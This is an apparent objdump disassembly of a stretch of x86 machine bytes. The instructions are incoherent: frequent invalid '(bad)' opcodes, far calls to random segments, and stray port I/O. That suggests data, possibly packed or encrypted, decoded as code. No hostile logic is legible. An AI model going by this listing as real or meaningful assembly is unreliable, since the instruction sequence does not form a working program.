  403f3b:	adc    al,0x7d
  403f3d:	mov    ebp,0x3be287ce
  403f42:	mov    ebp,0x4825f58c
  403f47:	jmp    0x9c85b5ca
  403f4c:	dec    ebp
  403f4d:	push   es
  403f4e:	xchg   esi,eax
  403f4f:	or     al,0x2a
  403f51:	sbb    BYTE PTR [ebp-0x21dec0f4],0x6e
  403f58:	or     BYTE PTR [esi*4+0xe4e483b],0x46
  403f60:	dec    esp
  403f61:	clc    
  403f62:	loop   0x403f7f
  403f64:	gs test eax,0x6a4e8568
  403f6a:	cmp    eax,0xb3ee653b
  403f6f:	or     cl,BYTE PTR [edi]
  403f71:	cwde   
  403f72:	sub    eax,0x2fccc357
  403f77:	shl    DWORD PTR [esi+ecx*4],1
  403f7a:	idiv   edi
  403f7c:	xor    al,bl
  403f7e:	mov    edi,0xd12f4c3e
  403f83:	addr16 call 0x57bb:0xf43da335
  403f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f8c:	(bad)  
  403f8d:	test   eax,0x7c7fde36
  403f92:	maskmovq mm3,mm5
  403f95:	mov    ds:0xbadc43e9,eax
  403f9a:	mov    ss,WORD PTR [esi]
  403f9c:	sar    BYTE PTR [edx-0x51],0xdc
  403fa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fa1:	mov    ch,0xf2
  403fa3:	mov    al,ds:0x8df6edd
  403fa8:	repnz adc ah,BYTE PTR [esi+0x2e]
  403fac:	mov    eax,ds:0x342404b3
  403fb1:	inc    esp
  403fb2:	test   al,0x6f
  403fb4:	leave  
  403fb5:	lods   al,BYTE PTR ds:[esi]
  403fb6:	test   BYTE PTR [eax+ebx*8-0x19],ch
  403fba:	cmp    eax,0x74e5f32f
  403fbf:	mov    esi,0xfa2b4d46
  403fc4:	mov    ds:0xd9bff4c6,al
  403fc9:	mov    dl,0x8b
  403fcb:	xor    cl,dh
  403fcd:	pop    ss
  403fce:	loop   0x404016
  403fd0:	sahf   
  403fd1:	mov    eax,0xd63c7c7d
  403fd6:	fst    QWORD PTR [eax]
  403fd8:	xchg   esi,eax
  403fd9:	mov    ecx,0x8be653ef
  403fde:	fs in  al,0x55
  403fe1:	add    BYTE PTR [ecx+ecx*2],dl
  403fe4:	sub    eax,0x1e86635c
  403fe9:	sbb    eax,0x18ea1262
  403fee:	dec    ebp
  403fef:	test   BYTE PTR [ebx+esi*4],dh
  403ff2:	adc    al,BYTE PTR [eax]
  403ff4:	jne    0x403f8e
  403ff6:	jmp    0x1170:0xd9072c46
  403ffd:	adc    al,0xa
  403fff:	mov    ch,0xb8
  404001:	out    dx,eax
  404002:	je     0x40404e
  404004:	push   ebp
  404005:	xor    al,0xfa
  404007:	test   eax,0x262c950d
  40400c:	inc    eax
  40400d:	jnp    0x403f90
  40400f:	popf   
  404010:	mov    bh,0xfa
  404012:	inc    ecx
  404013:	sti    
  404014:	out    0x2d,al
  404016:	push   ds
  404017:	mov    esi,0x8742246
  40401c:	add    al,BYTE PTR [edx+0x3c]
  40401f:	test   al,0x42
  404021:	icebp  
  404022:	inc    ebx
  404023:	test   eax,0x4740fca6
  404028:	dec    esi
  404029:	push   ss
  40402a:	repnz sbb cl,BYTE PTR [ebx-0xdbbed9c]
  404031:	xchg   BYTE PTR [esi],cl
  404033:	aaa    
  404034:	fs push 0x115b3a78
  40403a:	adc    dh,BYTE PTR [ebx]
  40403c:	mov    ebp,0x2b7f915a
  404041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404042:	sbb    ebx,DWORD PTR [ebx]
  404044:	int    0x21
  404046:	fistp  DWORD PTR [edx]
  404048:	add    ebp,eax
  40404a:	and    eax,0x60bbe79a
  40404f:	push   ss
  404050:	jecxz  0x4040c9
  404052:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404053:	repz mov bh,0x3b
  404056:	push   ds
  404057:	mov    DWORD PTR [esp+eax*1+0xe637204],edi
  40405e:	(bad)
  404061:	jo     0x4040d0
  404063:	fmul   QWORD PTR [eax-0x74]
  404066:	xor    BYTE PTR [ecx],bh
  404068:	ins    DWORD PTR es:[edi],dx
  404069:	mov    edi,0x43e61c88
  40406e:	push   esi
  40406f:	adc    esp,esp
  404071:	mov    edx,0x831ff992
  404076:	inc    esp
  404077:	outs   dx,DWORD PTR ds:[esi]
  404078:	vaddsubpd ymm3,ymm4,YMMWORD PTR [eax]
  40407c:	rcr    DWORD PTR [eax-0x22],cl
  40407f:	into   
  404080:	sub    DWORD PTR [ebx],ebx
  404082:	mov    eax,0x6c075a7a
  404087:	pusha  
  404088:	sub    dh,BYTE PTR [esi+0x33]
  40408b:	ins    DWORD PTR es:[edi],dx
  40408c:	fdiv   st,st(2)
  40408e:	xchg   DWORD PTR [edi],esi
  404090:	jle    0x4040c8
  404092:	sahf   
  404093:	imul   ecx,DWORD PTR [edi-0x4880c61],0x82593f47
  40409d:	mov    esi,0x7b4f3d79
  4040a2:	pop    esi
  4040a3:	cmp    edi,esp
  4040a5:	and    al,0xa5
  4040a7:	pop    ds
  4040a8:	jp     0x404125
  4040aa:	sahf   
  4040ab:	mov    ds:0xfd9fed23,al
  4040b0:	rol    DWORD PTR [ebx+0x4f],1
  4040b3:	sbb    dh,BYTE PTR [ebp+0x3e209284]
  4040b9:	cmp    cl,BYTE PTR [edi-0x6968362c]
  4040bf:	call   0x60cd:0x6d73241a
  4040c6:	add    ch,BYTE PTR [ecx-0x2d426f0b]
  4040cc:	mov    eax,ds:0x18946dd7
  4040d1:	test   al,0x28
  4040d3:	ds test ebx,0x535c2c49
  4040da:	repnz sbb dh,BYTE PTR [eax]
  4040dd:	dec    edx
  4040de:	jb     0x4040e1
  4040e0:	or     bh,BYTE PTR [esp+eiz*8-0x29]
  4040e4:	loope  0x404112
  4040e6:	adc    edx,DWORD PTR [ebp+0x14]
  4040e9:	out    0x44,al
  4040eb:	aam    0xf
  4040ed:	fmulp  st(3),st
  4040ef:	pop    edi
  4040f0:	and    DWORD PTR [esi-0x76b893b9],esp
  4040f6:	xor    al,0xdd
  4040f8:	aam    0xd4
  4040fa:	pushf  
  4040fb:	test   eax,0x1cbe9163
  404100:	cmp    BYTE PTR [edx-0x63b13ce1],cl
  404106:	xlat   BYTE PTR ds:[ebx]
  404107:	sbb    eax,0xbccd127c
  40410c:	cmp    bh,BYTE PTR [edi+0xb6486a8]
  404112:	adc    ebp,DWORD PTR [ebp-0x38b8b1de]
  404118:	ds jge 0x4040e5
  40411b:	mov    esp,0x33af324d
  404120:	dec    eax
  404121:	mov    eax,ds:0x628f6dd
  404126:	out    dx,al
  404127:	fidiv  DWORD PTR [edx+0x3c]
  40412a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40412b:	push   ebp
  40412c:	shl    DWORD PTR [ebp-0x8],1
  40412f:	inc    esp
  404130:	clc    
  404131:	ss inc esi
  404133:	or     BYTE PTR [edx+esi*8-0x40],ch
  404137:	in     eax,0x9
  404139:	sti    
  40413a:	xchg   ebp,eax
  40413b:	mov    cs,WORD PTR [eax-0x487549b0]
  404141:	repz cwde 
  404143:	xor    al,0x1f
  404145:	push   0x6b4c5bc5
  40414a:	cs out dx,eax
  40414c:	test   BYTE PTR [edx+0x5d335274],dh
  404152:	imul   esi,DWORD PTR [eax-0x33e896a8],0x25
  404159:	dec    edx
  40415a:	cs xchg ebx,eax
  40415c:	or     edi,DWORD PTR [ebx+0x4e]
  40415f:	mov    eax,0x5d6c4c85
  404164:	js     0x404109
  404166:	imul   DWORD PTR [ecx]
  404168:	add    DWORD PTR [ebp+edx*4-0x31dd31d5],edi
  40416f:	mov    bl,BYTE PTR [edi+0x64c3406d]
  404175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404176:	pop    ecx
  404177:	mov    esp,0x9231dada
  40417c:	mov    bl,0xb8
  40417e:	jo     0x40417a
  404180:	loopne 0x40413e
  404182:	call   0xd99a9280
  404187:	sbb    esp,eax
  404189:	sub    ecx,DWORD PTR [ecx-0x33]
  40418c:	cld    
  40418d:	mov    edi,esi
  40418f:	push   edx
  404190:	or     eax,0x93de8e2d
  404195:	inc    edi
  404196:	cmc    
  404197:	or     al,0xfa
  404199:	adc    BYTE PTR [edx],al
  40419b:	pop    edi
  40419c:	xchg   edi,eax
  40419d:	mov    ah,0x46
  40419f:	and    edi,eax
  4041a1:	pop    ds
  4041a2:	sbb    dh,dl
  4041a4:	mov    bl,0xd8
  4041a6:	retf   0x7b84
  4041a9:	enter  0xea4f,0x7a
  4041ad:	cld    
  4041ae:	sar    BYTE PTR ds:0x9c544887,1
  4041b4:	bswap  ebx
  4041b6:	clc    
  4041b7:	test   al,0x1c
  4041b9:	add    BYTE PTR [esi+0x6d],bh
  4041bc:	jl     0x40421c
  4041be:	add    DWORD PTR [eax],esi
  4041c0:	pop    ecx
  4041c1:	hlt    
  4041c2:	mov    dh,0x51
  4041c4:	addr16 je 0x4041de
  4041c7:	or     eax,edi
  4041c9:	ss pop es
  4041cb:	cli    
  4041cc:	push   eax
  4041cd:	pop    edx
  4041ce:	fdiv   QWORD PTR [edi]
  4041d0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4041d2:	pop    esp
  4041d3:	mov    ebx,0xbae84c12
  4041d8:	mov    cl,0x8
  4041da:	pop    ebx
  4041db:	inc    ebx
  4041dc:	mov    ebx,0x4f618542
  4041e1:	cmp    esp,DWORD PTR ds:0x9408065e
  4041e7:	aad    0xfe
  4041e9:	mov    bl,0x8f
  4041eb:	(bad)  
  4041ec:	arpl   si,bx
  4041ee:	sub    edi,DWORD PTR [ebx-0x4a]
  4041f1:	pop    ebp
  4041f2:	in     al,0x27
  4041f4:	add    al,0x23
  4041f6:	push   es
  4041f7:	std    
  4041f8:	cwde   
  4041f9:	sub    BYTE PTR [ecx-0x2fa60c9e],0x33
  404200:	scas   eax,DWORD PTR es:[edi]
  404201:	rol    BYTE PTR ds:0xa66ef75c,1
  404207:	ja     0x4041aa
  404209:	int3   
  40420a:	repz xlat BYTE PTR ds:[ebx]
  40420c:	fwait
  40420d:	cli    
  40420e:	ds ja  0x4041b0
  404211:	pop    esi
  404212:	mov    bh,0x5
  404214:	daa    
  404215:	int3   
  404216:	cmp    al,0x87
  404218:	sub    eax,DWORD PTR [ebx-0x52]
  40421b:	jecxz  0x4041d9
  40421d:	jmp    0x9b683b4e
  404222:	jae    0x40422f
  404224:	int3   
  404225:	xor    ah,bl
  404227:	sub    BYTE PTR [edx],ah
  404229:	mov    bl,0xf7
  40422b:	mov    bh,0x60
  40422d:	adc    DWORD PTR [esi],ecx
  40422f:	mov    al,ds:0xff4607fb
  404234:	push   cs
  404235:	(bad)  
  404236:	enter  0xfa66,0x4d
  40423a:	jo     0x404255
  40423c:	in     al,dx
  40423d:	xchg   DWORD PTR [eax+0x3c8cedaf],ecx
  404243:	adc    BYTE PTR [ecx+edi*8-0xd23e2ba],dh
  40424a:	jns    0x40422b
  40424c:	fucomp st(3)
  40424e:	push   eax
  40424f:	sub    ah,dh
  404251:	lea    esp,[eax]
  404253:	pop    esi
  404254:	(bad)  
  404256:	stos   BYTE PTR es:[edi],al
  404257:	repnz mov eax,0x58b28dad
  40425d:	fs (bad) 
  40425f:	pop    es
  404260:	pop    ebx
  404261:	push   cs
  404262:	mov    esp,0xb0356fe9
  404267:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404268:	not    BYTE PTR [edi-0x59]
  40426b:	dec    ebx
  40426c:	imul   edi,DWORD PTR [edi-0x4acb2e60],0xa1c7bd66
  404276:	outs   dx,BYTE PTR ds:[esi]
  404277:	fsubrp st(6),st
  404279:	xchg   esi,eax
  40427a:	inc    edi
  40427b:	push   ss
  40427c:	test   al,0xd7
  40427e:	jmp    0xc551b815
  404283:	inc    esi
  404284:	cdq    
  404285:	sbb    bl,cl
  404287:	sbb    eax,DWORD PTR [edi]
  404289:	lahf   
  40428a:	outs   dx,DWORD PTR ds:[esi]
  40428b:	xchg   edx,eax
  40428c:	pop    ebp
  40428d:	jns    0x4042cc
  40428f:	pop    edi
  404290:	stc    
  404291:	mov    ecx,0xb9558403
  404296:	dec    esp
  404297:	adc    bl,BYTE PTR [ebp-0x57]
  40429a:	mov    edx,0x8fd4181e
  40429f:	jno    0x404293
  4042a1:	fsub   DWORD PTR [edx+0x41539858]
  4042a7:	xchg   esi,eax
  4042a8:	push   0x8
  4042aa:	or     ebx,edi
  4042ac:	add    eax,0x3475a3c7
  4042b1:	xchg   ecx,eax
  4042b2:	mov    ds:0x6e9a965f,al
  4042b7:	sub    esi,DWORD PTR [eax]
  4042b9:	jnp    0x4042fb
  4042bb:	push   cs
  4042bc:	xchg   BYTE PTR [ecx+0x412f1a57],dl
  4042c2:	dec    esp
  4042c3:	xor    dh,bl
  4042c5:	(bad)  
  4042c6:	sub    dh,BYTE PTR [edi-0x5253e828]
  4042cc:	jne    0x4042c6
  4042ce:	jmp    0x2b301b58
  4042d3:	or     eax,0xa38412a2
  4042d8:	push   0xffffffe8
  4042da:	sbb    DWORD PTR [edx-0xc],0xffffffa8
  4042de:	sbb    ch,BYTE PTR [edx-0x61b81bfe]
  4042e4:	int3   
  4042e5:	sbb    ebp,DWORD PTR [edi]
  4042e7:	sbb    esi,ebx
  4042e9:	inc    eax
  4042ea:	push   esi
  4042eb:	(bad)  
  4042ec:	or     al,0xd0
  4042ee:	ror    DWORD PTR [ebp+0x30af33eb],1
  4042f4:	lahf   
  4042f5:	sbb    eax,0x4888ee90
  4042fa:	or     BYTE PTR [edi-0x7b],dl
  4042fd:	jg     0x404322
  4042ff:	pop    DWORD PTR ds:0x4bd3d0f7
  404305:	xor    al,BYTE PTR [edx-0x21a8a387]
  40430b:	lahf   
  40430c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40430d:	inc    esp
  40430e:	sahf   
  40430f:	gs iret 
  404311:	pop    ebx
  404312:	push   cs
  404313:	xor    al,dh
  404315:	dec    eax
  404316:	mov    BYTE PTR [edx],ch
  404318:	loop   0x4042df
  40431a:	mov    dh,0xe
  40431c:	lods   al,BYTE PTR ds:[esi]
  40431d:	lods   eax,DWORD PTR ds:[esi]
  40431e:	(bad)  
  40431f:	pusha  
  404320:	test   ch,ch
  404322:	mov    ah,0x2
  404324:	fldenv [eax]
  404326:	out    dx,al
  404327:	fwait
  404328:	aas    
  404329:	aam    0x26
  40432b:	mov    WORD PTR [edx-0x7d7bc186],es
  404331:	xchg   edx,eax
  404332:	adc    ah,BYTE PTR [ebx+0x50e05542]
  404338:	popf   
  404339:	jne    0x404354
  40433b:	enter  0x613e,0x99
  40433f:	xchg   esi,eax
  404340:	stos   DWORD PTR es:[edi],eax
  404341:	stos   DWORD PTR es:[edi],eax
  404342:	and    al,BYTE PTR [esi+0x34ff92d6]
  404348:	test   al,0xa8
  40434a:	ror    esi,1
  40434c:	push   ecx
  40434d:	pushf  
  40434e:	adc    cl,BYTE PTR [ecx]
  404350:	je     0x4043a4
  404352:	xchg   edi,eax
  404353:	mov    ecx,ebp
  404355:	and    eax,0x36e1caa2
  40435a:	mov    cl,BYTE PTR [eax]
  40435c:	mov    ebp,0x782fd808
  404361:	ret    0xa50f
  404364:	cmp    edx,DWORD PTR [edi-0x3e]
  404367:	pusha  
  404368:	pop    ds
  404369:	adc    ch,BYTE PTR [edi+ebp*8-0x13d02051]
  404370:	repnz pop ecx
  404372:	fist   DWORD PTR [edx]
  404374:	icebp  
  404375:	lods   eax,DWORD PTR ds:[esi]
  404376:	in     al,0x55
  404378:	fld    TBYTE PTR [esi+0x496c537a]
  40437e:	pop    esp
  40437f:	sub    ebp,DWORD PTR [ebp+0x756d0376]
  404385:	cwde   
  404386:	inc    edx
  404387:	dec    ebp
  404388:	push   ds
  404389:	scas   eax,DWORD PTR es:[edi]
  40438a:	sbb    esp,eax
  40438c:	pop    ebp
  40438d:	popf   
  40438e:	cwde   
  40438f:	push   cs
  404390:	push   ebp
  404391:	out    0x4e,al
  404393:	sub    al,0x14
  404395:	mov    ch,0x13
  404397:	jmp    0x55ba6653
  40439c:	mov    ch,0xfe
  40439e:	leave  
  40439f:	or     al,0xda
  4043a1:	(bad)  
  4043a2:	xchg   esi,eax
  4043a3:	mov    esi,0x2a6d2aa6
  4043a8:	xor    al,0x36
  4043aa:	jle    0x4043ab
  4043ac:	add    al,0xb6
  4043ae:	push   ebp
  4043af:	or     BYTE PTR [esi-0xc7805e1],bh
  4043b5:	dec    ebx
  4043b6:	xor    BYTE PTR [eax],bl
  4043b8:	adc    eax,0x80106328
  4043bd:	dec    ebp
  4043be:	imul   eax,DWORD PTR [esi+0x37],0xffffff95
  4043c2:	xchg   esp,eax
  4043c3:	inc    esp
  4043c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043c5:	in     al,dx
  4043c6:	ror    DWORD PTR [edi],cl
  4043c8:	adc    BYTE PTR [ecx],ch
  4043ca:	ja     0x404404
  4043cc:	bound  edi,QWORD PTR [esi+0x3bc479de]
  4043d2:	call   0x97c2f2a4
  4043d7:	idiv   BYTE PTR [ecx]
  4043d9:	enter  0x7765,0x9b
  4043dd:	xchg   ebp,eax
  4043de:	sbb    ah,dh
  4043e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043e1:	imul   esi,DWORD PTR [ebx],0xd897e9db
  4043e7:	mov    ecx,0x146a7b79
  4043ec:	lahf   
  4043ed:	and    esp,DWORD PTR [ecx-0x70]
  4043f0:	jo     0x4043c2
  4043f2:	clc    
  4043f3:	dec    ebx
  4043f4:	add    BYTE PTR [edx+edi*2+0x3f],ch
  4043f8:	pusha  
  4043f9:	fs call 0x45e7:0xf091cad1
  404401:	dec    esi
  404402:	push   edx
  404403:	adc    bl,BYTE PTR [edx-0x13]
  404406:	cwde   
  404407:	or     ebp,DWORD PTR [ebx-0x3f6f2f83]
  40440d:	mov    dl,0x59
  40440f:	imul   esi,DWORD PTR [eax-0x5f2255ad],0xffffffe6
  404416:	out    dx,eax
  404417:	call   0x7048:0x936917d7
  40441e:	call   0xba09:0x1a96d7cd
  404425:	sub    ebp,esi
  404427:	je     0x404488
  404429:	cs out dx,al
  40442b:	cs inc ebp
  40442d:	jmp    0x40447b
  40442f:	call   0x565c:0x71107efc
  404436:	xchg   esp,eax
  404437:	jns    0x404493
  404439:	dec    ebp
  40443a:	push   edx
  40443b:	xchg   BYTE PTR [edi],al
  40443d:	cmp    ecx,DWORD PTR [eax]
  40443f:	je     0x40443f
  404441:	jnp    0x404479
  404443:	(bad)  
  404445:	mov    esi,0xeebfcf79
  40444a:	mov    ecx,0xd40e7d0b
  40444f:	call   0xd4ceb3a5
  404454:	cs cdq 
  404456:	mov    eax,ds:0x259def4f
  40445b:	dec    esi
  40445c:	jbe    0x4043ef
  40445e:	ja     0x404464
  404460:	in     eax,dx
  404461:	outs   dx,DWORD PTR ds:[esi]
  404462:	push   ds
  404463:	mov    edi,0x682e3fd5
  404468:	ins    DWORD PTR es:[edi],dx
  404469:	das    
  40446a:	mov    bh,0x34
  40446c:	mov    esi,0x423a367a
  404471:	add    al,0xbb
  404473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404474:	fld    DWORD PTR ds:0xe88d4c33
  40447a:	sbb    BYTE PTR [edi+0x6b24b214],cl
  404480:	mov    bh,0xa5
  404482:	cwde   
  404483:	mov    ds:0x252ca5e4,al
  404488:	ret    
  404489:	jl     0x40443a
  40448b:	idiv   BYTE PTR [edi+0x121024e8]
  404491:	or     dh,ah
  404493:	mov    eax,0x391e7e38
  404498:	mov    esp,0x7ce8d7c
  40449d:	dec    ecx
  40449e:	adc    esp,edx
  4044a0:	cli    
  4044a1:	lahf   
  4044a2:	icebp  
  4044a3:	xor    al,0xde
  4044a5:	imul   DWORD PTR [eax]
  4044a7:	mov    gs,WORD PTR [edi+esi*8+0x4d]
  4044ab:	add    eax,0xe46da28
  4044b0:	jmp    0x4044b4
  4044b2:	add    dh,BYTE PTR [ecx-0x8]
  4044b5:	out    dx,al
  4044b6:	jle    0x404496
  4044b8:	fist   DWORD PTR [eax+ecx*4-0x78]
  4044bc:	push   ss
  4044bd:	and    cl,BYTE PTR [esi]
  4044bf:	sbb    DWORD PTR [ebp-0x1d],ecx
  4044c2:	cdq    
  4044c3:	retf   
  4044c4:	in     eax,dx
  4044c5:	jmp    0xb694:0x714cead7
  4044cc:	cmp    BYTE PTR [esi+0x51],dh
  4044cf:	mov    BYTE PTR [edi+0x61ed1464],ah
  4044d5:	repnz and DWORD PTR [edi+0x486b252e],edx
  4044dc:	les    esi,FWORD PTR [ebx]
  4044de:	jo     0x4044db
  4044e0:	mov    ecx,0x2ae3cfa
  4044e5:	in     al,0xfd
  4044e7:	mov    WORD PTR [edx-0x53],ss
  4044ea:	ja     0x4044ef
  4044ec:	xchg   esi,eax
  4044ed:	xor    DWORD PTR [esi],esi
  4044ef:	xlat   BYTE PTR ds:[ebx]
  4044f0:	inc    esp
  4044f1:	xor    al,bl
  4044f3:	xor    BYTE PTR [edi-0x17cd53ad],0x8f
  4044fa:	and    bl,BYTE PTR [edi]
  4044fc:	(bad)  
  4044fd:	nop
  4044fe:	sbb    esp,DWORD PTR [ebp+ecx*2-0x3e]
  404502:	sbb    al,0x47
  404504:	outs   dx,BYTE PTR ds:[esi]
  404505:	bound  eax,QWORD PTR [ebp-0x652601e1]
  40450b:	ins    BYTE PTR es:[edi],dx
  40450c:	cmp    DWORD PTR [edi],0x6f
  40450f:	mov    al,0x45
  404511:	pop    ecx
  404512:	inc    edx
  404513:	std    
  404514:	sbb    al,0x2d
  404516:	clc    
  404517:	repnz clc 
  404519:	repz push esp
  40451b:	jmp    0x3f6bb504
  404520:	jl     0x40455a
  404522:	das    
  404523:	pop    ss
  404524:	sbb    al,0xa4
  404526:	cwde   
  404527:	sub    esp,DWORD PTR ds:0x37952c3f
  40452d:	in     al,0xcd
  40452f:	sub    esp,DWORD PTR [edx+0x18]
  404532:	stos   DWORD PTR es:[edi],eax
  404533:	and    ch,ah
  404535:	xchg   ecx,eax
  404536:	xchg   DWORD PTR [edx+ebx*8+0x16],esp
  40453a:	stos   BYTE PTR es:[edi],al
  40453b:	pop    DWORD PTR [edx]
  40453d:	pop    es
  40453e:	ins    DWORD PTR es:[edi],dx
  40453f:	mov    edx,0x29741f7f
  404544:	jle    0x40451c
  404546:	push   ss
  404547:	pop    ebp
  404548:	ss inc edx
  40454a:	enter  0x44b2,0xc9
  40454e:	or     BYTE PTR [eax],dh
  404550:	inc    ebp
  404551:	mov    ch,0x75
  404553:	fst    st(5)
  404555:	push   ss
  404556:	call   0x11b4:0x7dc609a5
  40455d:	pop    ecx
  40455e:	enter  0xad7e,0x26
  404562:	add    bh,BYTE PTR [ecx]
  404564:	cmp    al,0xb0
  404566:	adc    DWORD PTR [ebx-0x43],ebx
  404569:	or     eax,DWORD PTR [edx-0x17b7d2fc]
  40456f:	pop    ds
  404570:	into   
  404571:	mov    al,0xcc
  404573:	sbb    DWORD PTR [ebp+ecx*4-0x40829252],edx
  40457a:	stc    
  40457b:	xor    eax,0xd6f33acd
  404580:	cdq    
  404581:	jle    0x404582
  404583:	pop    esp
  404584:	pop    ecx
  404585:	imul   ebx,esp,0x880511a4
  40458b:	mov    cl,0xf6
  40458d:	mov    eax,0xb0f9358e
  404592:	push   es
  404593:	scas   eax,DWORD PTR es:[edi]
  404594:	leave  
  404595:	push   0xa10142c5
  40459a:	add    ah,bh
  40459c:	iret   
  40459d:	cdq    
  40459e:	and    eax,0x7ea43f0
  4045a3:	pop    eax
  4045a4:	mov    edi,0xabb52540
  4045a9:	pop    edi
  4045aa:	mov    ds:0x635149a3,eax
  4045af:	push   esp
  4045b0:	jl     0x4045ec
  4045b2:	les    ecx,FWORD PTR [eax+0x4911cae2]
  4045b8:	mov    eax,gs:0x8ec0b7b9
  4045be:	jae    0x4045d1
  4045c0:	or     eax,0x2464cbb8
  4045c5:	add    ch,BYTE PTR [eax+0x41]
  4045c8:	add    DWORD PTR [esi],0x14
  4045cb:	leave  
  4045cc:	inc    ebp
  4045cd:	sbb    al,bl
  4045cf:	add    eax,0x34bf8905
  4045d4:	sbb    BYTE PTR [eax],cl
  4045d6:	lods   al,BYTE PTR ds:[esi]
  4045d7:	or     DWORD PTR [edx+0x27],0xffffffd6
  4045db:	sub    al,0x84
  4045dd:	and    eax,DWORD PTR [edx-0x67]
  4045e0:	dec    ebp
  4045e1:	xchg   ebp,eax
  4045e2:	pop    ds
  4045e3:	and    eax,0x6d6271dd
  4045e8:	bnd jl 0x4045a9
  4045eb:	xchg   edi,eax
  4045ec:	jmp    0x404655
  4045ee:	push   cs
  4045ef:	sub    al,0x9d
  4045f1:	loopne 0x404628
  4045f3:	into   
  4045f4:	sahf   
  4045f5:	inc    ebp
  4045f7:	es imul ecx,eax,0xfffffff4
  4045fb:	fucomp st(3)
  4045fd:	jmp    0xfd46916e
  404602:	mov    edi,edx
  404604:	inc    esi
  404605:	enter  0x335e,0x37
  404609:	fs icebp 
  40460b:	daa    
  40460c:	push   ss
  40460d:	mov    WORD PTR [ebx+0x38ab473],ss
  404613:	xchg   ecx,eax
  404614:	jns    0x40462e
  404616:	mov    edi,0x5579c229
  40461b:	sub    dh,cl
  40461d:	pop    ss
  40461e:	mov    ah,0x5c
  404620:	(bad)  
  404622:	xchg   DWORD PTR [edi-0x132e1df1],ecx
  404628:	xchg   edx,eax
  404629:	cmp    esp,0xffffff92
  40462c:	(bad)  
  40462d:	xlat   BYTE PTR ds:[ebx]
  40462e:	mov    dl,0xd
  404630:	xchg   ebp,eax
  404631:	aaa    
  404632:	xor    al,0xe6
  404634:	pop    esp
  404635:	loop   0x404632
  404637:	or     al,al
  404639:	or     al,BYTE PTR [edi-0x75]
  40463c:	ss jl  0x404621
  40463f:	hlt    
  404640:	scas   eax,DWORD PTR es:[edi]
  404641:	adc    DWORD PTR [ecx+0x44d01bab],esp
  404647:	mov    esp,0x33f70c79
  40464c:	(bad)  
  40464d:	cmp    dl,BYTE PTR [ebx-0x730602b1]
  404653:	xchg   ecx,eax
  404654:	dec    ebx
  404655:	push   esp
  404656:	mov    bh,0xcf
  404658:	jg     0x404684
  40465a:	scas   eax,DWORD PTR es:[edi]
  40465b:	push   edi
  40465c:	sbb    eax,0xf133a0b1
  404661:	push   ss
  404662:	dec    ecx
  404663:	call   0x8267:0x40132aea
  40466a:	mov    ah,BYTE PTR [eax+0x44d54b19]
  404670:	xor    al,ch
  404672:	(bad)  
  404673:	mov    ch,0xe6
  404675:	cmp    ah,BYTE PTR [esi+0x70bb24b3]
  40467b:	mov    WORD PTR [ebx],ss
  40467d:	retf   
  40467e:	sub    al,ch
  404680:	lock cli 
  404682:	or     esp,DWORD PTR [esi+0x7a59d1a6]
  404688:	pusha  
  404689:	push   0xffffff9b
  40468b:	pop    es
  40468c:	les    esi,FWORD PTR [esi]
  40468e:	sahf   
  40468f:	lds    edx,FWORD PTR [ebp+ecx*2+0x69]
  404693:	mov    ds:0x6a049acb,al
  404698:	(bad)  
  404699:	sti    
  40469a:	and    al,0x82
  40469c:	push   ss
  40469d:	xor    edx,DWORD PTR [esi-0x6077b2ca]
  4046a3:	add    cl,dl
  4046a5:	xchg   esi,eax
  4046a6:	adc    eax,0x9cbb79fa
  4046ab:	cwde   
  4046ac:	add    eax,0xb2cca8a2
  4046b1:	or     ah,ah
  4046b3:	rcl    ch,1
  4046b5:	push   0xb70f7980
  4046ba:	fs xchg bh,cl
  4046bd:	push   ecx
  4046be:	retf   0xd37
  4046c1:	and    esi,ebp
  4046c3:	test   DWORD PTR [esp+ebx*8-0x61b82044],edi
  4046ca:	aas    
  4046cb:	and    eax,0x2ead702
  4046d0:	jno    0x3e7e2dc1
  4046d6:	aas    
  4046d7:	and    ch,BYTE PTR [ebx-0x5d3f6059]
  4046dd:	mov    dl,0xcc
  4046df:	mov    bh,0x1c
  4046e1:	popa   
  4046e2:	mov    edi,0x2adbf4b
  4046e7:	outs   dx,DWORD PTR ds:[esi]
  4046e8:	or     eax,0x5140683f
  4046ed:	mov    ds:0x352cd767,al
  4046f2:	sbb    DWORD PTR [ecx+0x41],ebp
  4046f5:	pop    es
  4046f6:	aam    0x1
  4046f8:	sbb    bl,al
  4046fa:	retf   0xd457
  4046fd:	out    dx,eax
  4046fe:	aaa    
  4046ff:	dec    esi
  404700:	and    DWORD PTR [edi+esi*2+0x2a7206cb],edx
  404707:	(bad)  
  404708:	das    
  404709:	mov    dh,0xd4
  40470b:	push   ebx
  40470c:	clc    
  40470d:	das    
  40470e:	stos   BYTE PTR es:[edi],al
  40470f:	push   ds
  404710:	int    0xc
  404712:	mov    ebx,0xa57d8b84
  404717:	mov    esp,0xd6de4a6e
  40471c:	sti    
  40471d:	push   ss
  40471e:	icebp  
  40471f:	dec    eax
  404720:	aam    0x4d
  404722:	and    al,al
  404724:	sbb    eax,0xcfdcc7c
  404729:	test   BYTE PTR [ebp-0x6f],cl
  40472c:	bound  ecx,QWORD PTR [esi+0x4d]
  40472f:	xchg   ebp,eax
  404730:	pop    ss
  404731:	mov    ah,0x92
  404733:	inc    ecx
  404734:	pop    esp
  404735:	dec    edx
  404736:	adc    eax,DWORD PTR [edx-0x43]
  404739:	cmp    al,0x4c
  40473b:	sbb    bh,BYTE PTR [eax+0x32]
  40473e:	sbb    bl,BYTE PTR [ebx]
  404740:	lock push esp
  404742:	cmp    dh,dh
  404744:	les    esp,FWORD PTR [esi]
  404746:	std    
  404747:	or     dl,BYTE PTR [ebp+0x5eca4bd5]
  40474d:	pop    edi
  40474e:	sbb    DWORD PTR ds:0xbedc66b4,edx
  404754:	daa    
  404755:	push   ss
  404756:	mov    al,0x1d
